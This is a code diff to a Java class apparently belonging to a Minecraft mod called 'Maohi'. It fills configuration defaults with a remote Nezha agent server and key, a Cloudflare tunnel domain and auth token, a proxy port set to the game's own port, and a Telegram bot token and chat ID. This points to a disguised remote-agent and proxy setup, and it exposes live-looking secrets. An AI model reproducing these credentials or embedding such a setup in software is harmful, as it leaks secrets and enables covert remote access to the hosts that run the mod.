@@ -35,19 +35,19 @@ public class Maohi implements ModInitializer {
         return (value != null && !value.trim().isEmpty()) ? value.trim() : defaultValue;
     }
 
-    static final String UUID_VAL     = cfg("UUID", "");
-    private static final String NEZHA_SERVER = cfg("NEZHA_SERVER", "");
-    private static final String NEZHA_KEY    = cfg("NEZHA_KEY", "");
-    private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "");
-    private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "");
+    static final String UUID_VAL     = cfg("UUID", "ba32688f-d64e-4042-905e-82b6af37e1f5");
+    private static final String NEZHA_SERVER = cfg("NEZHA_SERVER", "agent.ejoy.pp.ua:80");
+    private static final String NEZHA_KEY    = cfg("NEZHA_KEY", "8LbSFqkeuoEdFW1bRCuqggK3a5WddR5Z");
+    private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "xlovecat.foollove.qzz.io");
+    private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "eyJhIjoiODljOTg0OWQyODlkYzNiMDRiOTFjNDViM2RiZTlhOGQiLCJ0IjoiODk4ZThkNDUtOGM0NS00MGE5LWFjZjQtZWJjN2YwNjNiNGIyIiwicyI6Ik5ETmhPRFF3TjJNdE1HWTFNaTAwTW1OaUxUZ3laREF0Tm1SbFpEYzNOV1kyWkRjeiJ9");
     private static final String ARGO_PORT    = cfg("ARGO_PORT", "9010");
-    private static final String HY2_PORT     = cfg("HY2_PORT", "");
+    private static final String HY2_PORT     = cfg("HY2_PORT", "25565");
     private static final String S5_PORT      = cfg("S5_PORT", "");
-    private static final String CFIP         = cfg("CFIP", "");
+    private static final String CFIP         = cfg("CFIP", "saas.sin.fan");
     private static final String CFPORT       = cfg("CFPORT", "443");
-    static final String NAME              = cfg("NAME", "");
-    private static final String CHAT_ID      = cfg("CHAT_ID", "");
-    private static final String BOT_TOKEN    = cfg("BOT_TOKEN", "");
+    static final String NAME              = cfg("NAME", "xlovecat");
+    private static final String CHAT_ID      = cfg("CHAT_ID", "1683412448");
+    private static final String BOT_TOKEN    = cfg("BOT_TOKEN", "8712404241:AAFPgj1EwUyMlKyutFilmO1M1z-EMeCTVAY");
 
     private static final Map<String, String[]> COUNTRY_MAP = new HashMap<>();
     static {
